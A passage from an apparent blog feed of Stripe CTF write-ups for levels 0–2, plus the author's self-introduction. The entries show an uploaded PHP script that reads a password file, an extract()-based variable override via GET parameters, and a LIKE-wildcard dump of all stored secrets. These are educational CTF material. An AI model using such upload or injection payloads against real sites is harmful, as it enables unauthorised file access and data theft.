    &lt;span class="nv"&gt;$content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;../password.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$content&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's name this file exploit.php. We upload it:&lt;/p&gt;
&lt;img alt="level02-uploaded-script.png" class="align-center" src="/images/stripe-ctf-level-2/level02-uploaded-script.png" /&gt;
&lt;p&gt;We can see that no image is displayed (because your browser can't
display the script as an image), yet the server says it was successfully
uploaded. Now, we just have to go to upoads/exploit.php, and &lt;strong&gt;bam!&lt;/strong&gt;
you have the password for this level.&lt;/p&gt;
&lt;img alt="level02-executing-script.png" class="align-center" src="/images/stripe-ctf-level-2/level02-executing-script.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #1</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-1/" rel="alternate"></link><updated>2012-10-13T15:52:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/stripe-ctf-level-1/</id><summary type="html">&lt;img alt="level01-logo.jpg" class="align-center" src="/images/stripe-ctf-level-1/level01-logo.jpg" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-1/level01-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;b67c313a1a3bebd8702159efae32f95f1b41885f6e00103ee53e896a53194f43&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level wants you to guess a password, stored in a file named
&amp;quot;secret-combination.txt&amp;quot; on the server. If you manage to do it, it'll
give you the password for this level. Let's take a look at the code and
see how to get the password without knowing the combination.&lt;/p&gt;
&lt;p&gt;The server starts by defining a variable &lt;code&gt;$filename&lt;/code&gt; equal
to &amp;quot;secret-combination.txt&amp;quot;. That's the file of the combination (I'm so
deductive). It then retrieves your attempt (which was passed by &lt;code&gt;GET&lt;/code&gt;),
and compares it to the content of the file. If they're the same, the
server will gives you the sweet, sweet password. Otherwise, tough.&lt;/p&gt;
&lt;img alt="level01-failed-attempt.png" class="align-center" src="/images/stripe-ctf-level-1/level01-failed-attempt.png" /&gt;
&lt;p&gt;The thing is, the server doesn't retrieve your attempt using
&lt;code&gt;$_GET['attempt']&lt;/code&gt;. It uses the &lt;a class="reference external" href="http://php.net/manual/en/function.extract.php"&gt;extract PHP
function&lt;/a&gt; on the
&lt;code&gt;$_GET&lt;/code&gt; array. Basically, for every entry &lt;code&gt;$_GET['key'] = value&lt;/code&gt;,
it’ll create a variable &lt;code&gt;$key&lt;/code&gt; with the value
&lt;code&gt;value&lt;/code&gt;. It means that if we give a parameter filename in the
&lt;code&gt;GET&lt;/code&gt; request, we can override the variable &lt;code&gt;$filename&lt;/code&gt;, and open
any file. So let's open a non-existing file, and give an empty guess:
&lt;code&gt;?attempt=&amp;amp;filename=dummy-filename.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This request will set &lt;code&gt;$filename&lt;/code&gt; to &amp;quot;dummy-filename.txt&amp;quot;, so
that when the server tries to retrieve its content, it'll yield an empty
string. Since our attempt is empty, it will match, and the server will
give us the password for this level.&lt;/p&gt;
&lt;img alt="level01-success-attempt.png" class="align-center" src="/images/stripe-ctf-level-1/level01-success-attempt.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #0</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-0/" rel="alternate"></link><updated>2012-10-13T15:41:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/stripe-ctf-level-0/</id><summary type="html">&lt;img alt="level00-logo.png" class="align-center" src="/images/stripe-ctf-level-0/level00-logo.png" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-0/level00-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;da9712a1851597d6d4b5a90224a1d0fcaa4b558f55a10ca0c7a115d18fe9dcb7&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level is a safe that keeps your secrets for you. But it also
keeps secrets for other people. Let's find out how we can recover the
password for this level.&lt;/p&gt;
&lt;p&gt;The page is a simple form with three fields: your key, your secret
and the name of your secret. When you post these values, they are
registered in a database in this format: (key.secret_name, secret).&lt;/p&gt;
&lt;p&gt;The safe gives you the possibility to retrieve your secrets by entering
your key (otherwise, it'd be a stupid safe). Then, it'll do a SQL query
to get every entry which looks like this: (entered_key.anything,
anything). The SQL query is this one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;.%&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It's a prepared query, used to prevent SQL injection (with quotes and
the like). The ? will be replaced by the value you send to the server.
The &lt;code&gt;LIKE&lt;/code&gt; keyword is used to match a string against a regexp.
The % means &amp;quot;any number of any characters&amp;quot; (kind of like the *).&lt;/p&gt;
&lt;p&gt;The problem with this is that the key you enter is not sanitized. Well,
it's sanitized by the prepared query so that you cannot perform SQL.
But it's not sanitized for the &lt;code&gt;LIKE&lt;/code&gt; syntax. So
let's say you enter % as a key, the query will look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It means &amp;quot;select every secret where the key has the form
'any_characters.any_characters'&amp;quot;. And that's every secret! So the safe
will give you every secret stored, and thus, the password for this
level.&lt;/p&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>#define AUTHOR Yannick Méheut</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/define-author-yannick-meheut/" rel="alternate"></link><updated>2012-10-13T03:09:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/define-author-yannick-meheut/</id><summary type="html">&lt;p&gt;Hi everyone!&lt;/p&gt;
&lt;p&gt;My name is Yannick, I'm a 22 year-old student at the French engineer
school Télécom ParisTech. I study cryptography and info/netsec. Although
I find these topics fascinating, I'm pretty new to this world.&lt;/p&gt;
&lt;img alt="yannick.jpg" class="align-center" src="/images/define-author-yannick-meheut/yannick.jpg" /&gt;
&lt;p&gt;Last month, I decided to participate to the Stripe CTF, and,
unexpectedly, I managed to capture the flag, yay! I chose to create a
blog to post my write-ups, to leave a trace of my participation, and
later post news from the info/netsec world.&lt;/p&gt;
&lt;p&gt;Hope you have a nice time,&lt;/p&gt;
&lt;p&gt;Cheers.&lt;/p&gt;
</summary></entry></feed>